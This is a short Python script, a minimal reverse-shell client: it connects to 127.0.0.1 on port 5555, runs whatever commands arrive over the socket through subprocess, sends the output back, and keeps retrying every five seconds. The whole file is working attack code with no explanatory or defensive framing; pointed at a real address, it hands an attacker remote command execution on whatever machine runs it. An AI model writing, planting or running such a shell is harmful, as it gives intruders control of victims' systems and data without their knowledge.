import socket
import subprocess
import os
import time

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("127.0.0.1", 5555))
            while True:
                command = s.recv(1024).decode()
                output = subprocess.getoutput(command)
                s.send(output.encode())

        except Exception:
            time.sleep(5)

if __name__ == "__main__":
    connect()
